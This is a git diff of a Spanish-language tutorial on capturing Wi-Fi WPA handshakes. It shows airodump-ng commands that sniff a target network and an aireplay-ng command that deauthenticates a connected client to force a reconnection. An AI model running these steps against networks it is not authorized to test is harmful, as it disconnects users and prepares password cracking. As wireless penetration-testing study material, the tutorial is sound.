@@ -141,7 +141,11 @@ captura de handshakes:
 ```
 airodump-ng mon0
 airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
-en la terminal de al lado
+```
+ahora solo sientate y espera a recibir el handshake cuando se algun dispositivo se conecte a la red en la parte de la derecha de la ventana 
+
+puedes para no esperar deautentificar al cliente este volvera a intentar conectarse y asi capturamos el handshake
+```
 aireplay-ng --deauth 4 -a (BSSID) -c (STATION) mon0
 ```
 en la ventana de ariba a la derecha veremos el handshake
